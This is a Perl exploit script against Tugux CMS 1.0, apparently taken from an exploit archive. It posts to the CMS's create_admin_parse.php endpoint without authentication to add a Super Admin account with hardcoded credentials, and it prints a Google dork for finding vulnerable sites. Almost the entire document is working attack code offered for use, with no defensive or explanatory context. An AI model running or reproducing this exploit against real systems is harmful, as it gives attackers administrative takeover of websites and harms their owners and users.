+--------------------+
| Exploit (Perl Code)|
+--------------------+
(This Exploit will Add
a new Super Admin Account)
 
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use LWP 5.64;
my $browser = LWP::UserAgent->new();
my $url=$ARGV[0];
print "+----------------------------------------+\n";
print "| Tugux CMS 1.0 Multiple Vulnerabilities |\n";
print "+----------------------------------------+\n\n";
print "Author             : Aodrulez.\n";
print "Email              : f3arm3d3ar\@gmail.com\n";
print "Google-Dork        : \"Copyright 2010-2011 Tugux CMS\"\n";
if(!$url)
{die ("\nPlease enter the target url. Ex. perl $0 http://www.test.com");}
my $exploit='/administrator/create_admin_parse.php';
print "\n[+] Creating a new Super Admin \\m/";
$response = HTTP::Request->new(POST => $url.$exploit) or die("\n Connection Error!");
$response->content_type("application/x-www-form-urlencoded");
$response->content("username=Aodrulez&pass1=aod&type=a");
my $data=$browser->request($response)->as_string;
if($data!~m/HTTP\/1.1 200 OK/){ die ("\n$url Not Vulnerable!\n");}
print "\n[!] Admin Username : Aodrulez\n[!] Admin Password : aod\n[!] Type : Super Admin.\n";